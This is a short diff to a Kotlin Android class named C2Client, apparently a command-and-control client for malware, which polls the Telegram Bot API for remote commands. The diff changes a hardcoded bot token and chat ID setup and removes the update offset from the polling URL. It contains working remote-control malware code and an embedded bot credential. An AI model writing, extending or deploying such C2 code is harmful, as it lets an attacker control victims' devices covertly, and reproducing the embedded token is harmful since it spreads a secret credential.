@@ -17,7 +17,7 @@ class C2Client(private val ctx: Context) {
         .writeTimeout(60, TimeUnit.SECONDS)
         .build()
 
-    private val BOT_TOKEN = "8561465025:AAE1gWJhFxVP016X0c0fYXjzpW6oN5x1P9A"
+    private val BOT_TOKEN = "8561465025:AAE1gWJhFxVPO16XOcOfYXjzpW6oN5x1P9A"
     private val CHAT_ID = "8526210532"
     private var lastUpdateId = 0L
 
@@ -39,7 +39,7 @@ class C2Client(private val ctx: Context) {
 
     private suspend fun pollCommands() = withContext(Dispatchers.IO) {
         try {
-            val url = "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=$lastUpdateId&timeout=5"
+            val url = "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?timeout=5"
             val req = Request.Builder().url(url).build()
             http.newCall(req).execute().use { resp ->
                 val body = resp.body?.string() ?: return@withContext
